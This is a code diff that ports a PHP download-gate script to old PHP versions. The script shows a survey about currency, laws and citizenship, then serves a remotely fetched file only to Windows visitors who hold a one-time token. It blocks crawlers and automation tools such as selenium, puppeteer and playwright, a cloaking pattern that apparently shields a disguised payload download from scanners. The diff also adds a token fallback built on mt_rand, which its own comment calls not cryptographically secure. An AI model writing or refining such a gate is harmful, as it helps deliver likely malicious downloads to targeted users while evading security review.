@@ -18,6 +18,20 @@ $botSigs = [
     'phpcrawl','phantomjs','headlesschrome','selenium','puppeteer','playwright'
 ];
 
+// hash_equals for PHP < 5.6
+if (!function_exists('hash_equals')) {
+    function hash_equals($a, $b) {
+        if (strlen($a) !== strlen($b)) {
+            return false;
+        }
+        $result = 0;
+        for ($i = 0; $i < strlen($a); $i++) {
+            $result |= ord($a[$i]) ^ ord($b[$i]);
+        }
+        return $result === 0;
+    }
+}
+
 function isBot($ua) {
     global $botSigs;
     $lower = strtolower($ua);
@@ -35,7 +49,17 @@ function isWindows($ua) {
 
 function makeToken() {
     global $tokenExpiry;
-    $t = bin2hex(random_bytes(32));
+    // Use openssl_random_pseudo_bytes for PHP 5.4 (fallback to mt_rand if needed)
+    if (function_exists('openssl_random_pseudo_bytes')) {
+        $bytes = openssl_random_pseudo_bytes(32);
+        $t = bin2hex($bytes);
+    } else {
+        // Fallback (not cryptographically secure but works)
+        $t = '';
+        for ($i = 0; $i < 32; $i++) {
+            $t .= sprintf('%02x', mt_rand(0, 255));
+        }
+    }
     $_SESSION['dl_t'] = $t;
     $_SESSION['dl_ts'] = time();
     return $t;
@@ -44,62 +68,63 @@ function makeToken() {
 function useToken($t) {
     global $tokenExpiry;
     if (empty($t)) return false;
-    $s = $_SESSION['dl_t'] ?? '';
-    $ts = $_SESSION['dl_ts'] ?? 0;
+    $s = isset($_SESSION['dl_t']) ? $_SESSION['dl_t'] : '';
+    $ts = isset($_SESSION['dl_ts']) ? $_SESSION['dl_ts'] : 0;
     if (!hash_equals($s, $t)) return false;
     if ((time() - $ts) > $tokenExpiry) return false;
     unset($_SESSION['dl_t'], $_SESSION['dl_ts']);
     return true;
 }
 
-$action = $_GET['action'] ?? '';
+$action = isset($_GET['action']) ? $_GET['action'] : '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'submit') {
     header('Content-Type: application/json; charset=utf-8');
     header('X-Content-Type-Options: nosniff');
 
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
     if (isBot($ua)) {
         http_response_code(403);
-        exit(json_encode(['ok' => false]));
+        exit(json_encode(array('ok' => false)));
     }
 
     $raw = file_get_contents('php://input');
     $data = json_decode($raw, true);
     if (!is_array($data)) {
         http_response_code(400);
-        exit(json_encode(['ok' => false]));
+        exit(json_encode(array('ok' => false)));
     }
 
-    $required = ['currency', 'laws', 'citizen'];
+    $required = array('currency', 'laws', 'citizen');
     foreach ($required as $f) {
-        if (empty(trim($data[$f] ?? ''))) {
-            exit(json_encode(['ok' => false, 'error' => 'required', 'field' => $f]));
+        $val = isset($data[$f]) ? trim($data[$f]) : '';
+        if ($val === '') {
+            exit(json_encode(array('ok' => false, 'error' => 'required', 'field' => $f)));
         }
     }
 
-    $ok = in_array($data['currency'] ?? '', ['dram','euro','both'])
-       && in_array($data['laws'] ?? '', ['yes','no','undecided'])
-       && in_array($data['citizen'] ?? '', ['yes','no']);
+    $currencyOk = isset($data['currency']) && in_array($data['currency'], array('dram','euro','both'));
+    $lawsOk = isset($data['laws']) && in_array($data['laws'], array('yes','no','undecided'));
+    $citizenOk = isset($data['citizen']) && in_array($data['citizen'], array('yes','no'));
 
-    if (!$ok) {
-        exit(json_encode(['ok' => false, 'error' => 'invalid']));
+    if (!$currencyOk || !$lawsOk || !$citizenOk) {
+        exit(json_encode(array('ok' => false, 'error' => 'invalid')));
     }
 
     if (!empty($data['email']) && !filter_var($data['email'], FILTER_VALIDATE_EMAIL)) {
-        exit(json_encode(['ok' => false, 'error' => 'email']));
+        exit(json_encode(array('ok' => false, 'error' => 'email')));
     }
 
     $token = makeToken();
-    echo json_encode(['ok' => true, 'token' => $token, 'dl' => isWindows($ua)]);
+    echo json_encode(array('ok' => true, 'token' => $token, 'dl' => isWindows($ua)));
     exit;
 }
 
 if ($action === 'dl') {
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
     if (isBot($ua) || !isWindows($ua)) { http_response_code(403); exit; }
 
-    $t = $_GET['t'] ?? '';
+    $t = isset($_GET['t']) ? $_GET['t'] : '';
     if (!useToken($t)) { http_response_code(403); exit; }
     if (empty($downloadUrl)) { http_response_code(503); exit; }
 
@@ -112,7 +137,7 @@ if ($action === 'dl') {
     header('Pragma: no-cache');
 
     $ch = curl_init($downloadUrl);
-    curl_setopt_array($ch, [
+    curl_setopt_array($ch, array(
         CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_MAXREDIRS      => 10,
         CURLOPT_TIMEOUT        => 600,
@@ -124,7 +149,7 @@ if ($action === 'dl') {
             flush();
             return strlen($chunk);
         },
-    ]);
+    ));
     curl_exec($ch);
     curl_close($ch);
     exit;
